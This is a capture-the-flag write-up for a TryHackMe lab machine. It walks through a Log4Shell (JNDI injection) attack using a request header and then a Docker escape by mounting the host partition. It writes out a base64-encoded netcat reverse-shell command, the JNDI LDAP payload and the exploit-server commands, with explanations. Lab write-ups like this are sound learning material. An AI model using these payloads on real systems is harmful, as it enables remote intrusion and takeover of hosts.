# Lumberjack Turtle TryHackMe WriteUp
### Machine IP = 10.113.150.218
Firstly, lets make a port scan:
```bash
rustscan -a 10.113.150.218
```
The web site said us to go deeper. So, lets do a directory scan.
```bash
ffuf -u http://10.113.150.218/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0,44 -t 250

error    [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 136ms]
~logs    [Status: 200, Size: 29, Words: 6, Lines: 1, Duration: 162ms]
```
Web site said us to go deeper again so I made another directory scan:
```bash
ffuf -u http://10.113.150.218/~logs/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0,44 -t 250

log4j    [Status: 200, Size: 47, Words: 8, Lines: 1, Duration: 662ms]
```
|  
<img width="1149" height="174" alt="Screenshot From 2026-03-10 17-19-15" src="https://github.com/user-attachments/assets/a7e7beb9-3cdd-4a1a-943f-89977067a641" />  
|  
  
This hint make me think that we dont need another directory scan. The wulnerability is in that page. But what is the vulnerability?   

Log4j is a famous library used in Java programs for logging. Logging is very important because if a user registers or logs in, the Java program records this event as a log (for example: **INFO: user farid access to the system**).  

However, there is a vulnerability in this library. It has a feature called Lookups. When Log4j sees special brackets in a message while writing a log, it tries to go and fetch that data from somewhere. For example, if you write **${java:version}**, it finds the version and writes **"Java version 1.8"** in the log.
  
Beyond just **internal data**, **Log4j** also allowed fetching information from remote servers using **JNDI (Java Naming and Directory Interface)**. This is the part that makes it dangerous, because while normal lookups only showed internal data, **JNDI** allowed the library to connect to **external servers**. That is what we will do. But first of all, lets check the request on the burp suite.
|  
<img width="1393" height="344" alt="image" src="https://github.com/user-attachments/assets/ab641205-d428-49c5-a81d-2df89bc37190" />  
|  
Look at the hint !! It says that the vulnerability is located at X-Api-Version request header. Lets create our malicious request. We need to get reverse shell so, lets to create it's base64 encoded version.
```bash
┌──(faridd㉿Ferid)-[~/Downloads/Log4shell_JNDIExploit]
└─$ echo -n "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.137.68 1337 >/tmp/f" | base64 -w 0
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xMzcuNjggMTMzNyA+L3RtcC9m
```
-w 0 is so essential because we dont need any spaces.

----
We will need a tool " JNDIExploit ". If you don't have, lets install it:
```bash
git clone https://github.com/black9/Log4shell_JNDIExploit.git
cd Log4shell_JNDIExploit\nls
unzip JNDIExploit.v1.2.zip
```
Now, we have **"JNDIExploit-1.2-SNAPSHOT.jar"** which we will use it for getting reverse shell. But what happens? What this tool is used for in real?

I write:
```bash
X-Api-Version: ${jndi:ldap://192.168.137.68:1389/Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2bJjF8bmMgMTkyLjE2OC4xMzcuNjggMTMzNyA%2bL3RtcC9m}
```
in request header. As you can see I addedd LDAP protocol in here. This line says to the target server that, "go to this address and find the **Class file**". This ip address is my machine's, so, the target server will take it from me. When I add this line to the request and send it, the server doesn't execute my payload. It just came to the address of mine and asks for the Class file from the 1389 port. I use this command to run the JNDIExploit before sending the request. And don't forget to open **1337 nc connection** at the same time on another terminal.
```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.137.68 -p 8888

#It works old java version, so you need to change this command (to force it work on latest version) if it doesn't work. I used this command instead of it:

java --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.compiler=ALL-UNNAMED -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.137.68 -p 8888
```
After this, the **JNDIExploit** see that the Target Server sent a **Basic/Command** query. It takes the base64 code (reverse shell), take it into a class file, and say to Target Server - " I can't send you the Class file over the LDAP but you can take it from my address (192.168.137.68 -p 8888). The Target Server upload this Class File and run it in the JVM (Java Virtual Machine) and BOMMM, We got shell from our nc 1337 connection.  

<img width="1393" height="438" alt="image" src="https://github.com/user-attachments/assets/6ee907ff-610b-41a3-a8c6-e3b6b36b9d5a" />  
After sending this **(don't forget to run JNDIExploit and nc -nvlp 1337 before it)**, I got the shell as **"root"** user.

----
## User Flag
By this command I saw the user flag.
```bash
find / -type f | grep "flag"

/opt/.flag1
```

## Root Flag
I tried suid binaries:
```bash
 # find / -perm /4000 2>/dev/null 
/bin/umount
/bin/mount
```
I also noticed that we are in docker container. There was a ".dockerenv" file in the root folder. So, we will try to mount the real machine's files into this container.

----
## Post-Exploitation: Docker Escape via Privileged Capabilities
### 1. Identifying Capabilities

Once inside the Docker container, the first step is to determine the scope of our privileges. We check the effective capabilities of our current process:
```bash
cat /proc/self/status | grep CapEff
# Output: CapEff: 000001ffffffffff
```
The hexadecimal value 000001ffffffffff indicates that the container is running in privileged mode. Using the capsh --decode logic, we identify several critical capabilities:

    CAP_SYS_ADMIN: Allows performing various system administration tasks (required for mounting).

    CAP_MKNOD: Allows creating special files (device nodes) using mknod.

    CAP_NET_RAW: Allows direct access to network packets.

### 2. Enumerating Host Partitions

Since we have the power to mount devices, we need to find where the host machine's data is stored. We check the available partitions:
```bash
cat /proc/partitions
```
The output shows:

    259 0 41943040 nvme0n1

    259 1 41941999 nvme0n1p1 (Primary Partition based on size)

    259 2 1048576 nvme1n1

Based on the block size (approx. 40GB), nvme0n1p1 is identified as the main partition of the host machine.

Disk vs. Partition

    nvme0n1 (The Disk): This is the entire physical storage device. Think of it as a bookshelf.

    nvme0n1p1 (The Partition): This is a specific section of that disk. Think of it as a shelf inside the bookshelf.

In Linux, we do not mount the raw disk itself (nvme0n1) because it only contains the partition table. Instead, we mount the partition (nvme0n1p1) because that is where the actual file system (files, folders, and our flag) is stored.

The slight difference in size between the two is because a small amount of space at the beginning of the disk is reserved for the Partition Table (the map that tells the system where each "shelf" starts).

### 3. Executing the Escape (Mounting the Host)

To access the host's files, we manually create a device node and mount the partition to our container's file system:

#### Step 1: Create the device file using major (259) and minor (1) numbers
```bash
mknod /dev/nvme0n1p1 b 259 1
```
#### Step 2: Prepare a mount point
```bash
mkdir -p /mnt/real_host
```
#### Step 3: Mount the host's disk
```bash
mount /dev/nvme0n1p1 /mnt/real_host
```
### 4. Bypassing Deception & Finding the Flag

After mounting, we navigate to the host's root directory: /mnt/real_host/root/.
The initial root.txt file was a decoy, returning the message: "Pffft. Come on. Look harder."

Upon closer inspection with ls -la, a hidden directory named ... (triple dots) was discovered. This is a common obfuscation technique used to hide directories from casual observation.

The final flag was located inside this hidden path:
```bash
cat /mnt/real_host/root/.../._fLaG2
```






